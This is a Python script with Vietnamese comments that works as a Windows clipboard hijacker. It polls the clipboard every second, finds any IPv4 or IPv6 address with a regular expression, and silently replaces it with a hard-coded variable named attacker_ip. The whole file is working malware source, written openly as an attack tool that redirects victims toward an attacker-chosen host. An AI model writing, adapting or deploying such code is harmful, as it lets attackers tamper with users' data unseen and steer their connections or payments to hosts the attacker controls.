import win32clipboard
import re
from time import sleep
  
attacker_ip = "172.217.194.113"     #172.217.194.113  địa chỉ ip thay thế thay thế 
ip_regex = r'\b(?:\d{1,3}\.){3}\d{1,3}\b|\b(?:[0-9a-fA-F]{1,4}:){1,7}[0-9a-fA-F]{1,4}\b'  #biểu thức chính quy hợp lệ bằng mã regex 
  
print("[+] Đang giám sát clipboard. Nhấn Ctrl+C để dừng.")
  
try:
      while True:
          win32clipboard.OpenClipboard() # mở clipboard 
          try:
              data = win32clipboard.GetClipboardData().strip()  #Lấy dữ liệu từ clipboard và loại bỏ khoảng trắng
              new_data = re.sub(ip_regex, attacker_ip, data.lower()) # Thay thế tất cả ip mình muốn 
              if new_data != data.lower():  # Kiểm tra nếu có sự thay đổi
                  print(f"[!] Phát hiện ip: {data} → Thay thế bằng {attacker_ip}")
                  win32clipboard.EmptyClipboard()# Xóa dữ liệu trong clipboard
                  win32clipboard.SetClipboardText(new_data)  # Thay thế ip
          except Exception as e:
              print(f"Error: {e}")  # Nếu clipboard không chứa ip, in ra lỗi
          finally:
              win32clipboard.CloseClipboard() # Đóng clipboard
          sleep(1)  # Chờ 1 giây trước khi kiểm tra lại
except KeyboardInterrupt:
      print("\n[+] Script đã dừng.")